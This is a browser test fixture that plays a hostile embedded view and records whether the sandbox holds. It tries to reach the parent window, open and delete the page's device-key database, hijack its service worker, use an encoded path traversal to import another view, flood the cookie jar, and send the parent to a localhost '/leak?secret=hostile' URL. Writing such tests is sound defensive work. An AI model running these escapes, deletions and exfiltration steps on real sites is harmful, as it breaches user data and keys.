// A hostile view (phone-views.spec.ts): shown on the phone page, it tries to reach what is the
// page's, not its own: the page's window, the device key in its IndexedDB, its service worker, its
// server, the page's address, a page of its own origin with no rules; and what a view shown before it
// left, and another view's files. Each attempt lands on the body as data-<attempt>, "blocked" or
// "reached: <what>", for the test to read; data-done once all have. It fills the cookie jar the page's
// requests carry (cookies hold no port), and last, takes its frame to another host, with a secret.
const r = {};
const page = location.ancestorOrigins?.[location.ancestorOrigins.length - 1] ?? "";
const within = (ms, p) => Promise.race([p, new Promise((done) => setTimeout(() => done("hung"), ms))]);
async function attempt(name, reach) {
  try {
    const got = await within(5000, reach());
    r[name] = got ? `reached: ${got}` : "blocked";
  } catch {
    r[name] = "blocked";
  }
}
const opened = (name) => new Promise((done, fail) => {
  const o = indexedDB.open(name);
  o.onsuccess = () => done(o.result);
  o.onerror = () => fail(o.error);
});

const left = [
  localStorage.getItem("left") && "localStorage",
  (await indexedDB.databases()).some((d) => d.name === "left") && "IndexedDB",
  (await caches.has("left")) && "caches",
  document.cookie.includes("left0=") && "cookie",
].filter(Boolean);
r.leftovers = left.join(",") || "none";

await attempt("window", () => top.document.title || "its document");
await attempt("storage", () => top.indexedDB && "its IndexedDB");
await attempt("deviceKey", async () => {
  if ((await indexedDB.databases()).some((d) => d.name === "hive-web")) return "hive-web listed";
  const db = await opened("hive-web");
  const kept = db.objectStoreNames.contains("kept");
  db.close();
  indexedDB.deleteDatabase("hive-web");
  return kept && "the kept store";
});
await attempt("serviceWorker", async () => {
  const theirs = (await navigator.serviceWorker.getRegistrations()).find((s) => s.scope.includes("/phone/"));
  if (theirs) return theirs.scope;
  await navigator.serviceWorker.register(`${page}/phone/sw.js`, { scope: `${page}/phone/` });
  return "registered the page's";
});
await attempt("server", async () => `fetched ${(await fetch(`${page}/phone/views.json`)).status}`);
await attempt("socket", () => new Promise((done, fail) => {
  const ws = new WebSocket(`${page.replace(/^http/, "ws")}/relay`);
  ws.onopen = () => done("opened");
  ws.onerror = () => fail();
}));
await attempt("unruled", () => new Promise((done, fail) => {
  const frame = parent.document.createElement("iframe");
  frame.src = "/nothing-here";
  frame.onload = async () => {
    try {
      done(`fetched ${(await frame.contentWindow.fetch(`${page}/phone/views.json`)).status}`);
    } catch {
      fail();
    }
  };
  parent.document.body.append(frame);
}));
await attempt("otherView", async () => {
  await import("./%2e%2e/phone-probe/main.js");
  return "ran phone-probe";
});
// Whether the page moved is for the test to see.
try {
  top.location.href = `${page}/phone/#hostile`;
} catch {}

for (let i = 0; i < 180; i++) document.cookie = `left${i}=${"x".repeat(4000)}; path=/`;
r.jar = `${document.cookie.length} bytes`;
localStorage.setItem("left", "1");
(await opened("left")).close();
await caches.open("left");

for (const [k, v] of Object.entries(r)) document.body.dataset[k] = v;
document.body.dataset.done = "1";
setTimeout(() => (parent.location.href = `${location.protocol}//localhost:${location.port}/leak?secret=hostile`), 500);
